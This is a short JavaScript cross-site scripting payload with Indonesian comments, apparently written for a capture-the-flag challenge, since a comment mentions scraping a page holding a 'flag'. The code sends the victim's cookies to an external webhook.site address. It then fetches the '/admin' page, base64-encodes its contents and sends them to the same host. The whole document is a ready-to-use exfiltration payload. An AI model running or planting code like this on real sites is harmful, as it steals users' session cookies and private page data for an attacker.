// --- opsi: kirim cookie jika tidak httpOnly
try {
  if (document.cookie) {
    fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?cookie=' + encodeURIComponent(document.cookie));
  }
} catch(e) {}

// --- opsi utama: scrap halaman internal yang memuat flag
fetch('/admin')       // ganti ke '/flag' atau '/' kalau perlu
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t)))
  .catch(err => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(err)));
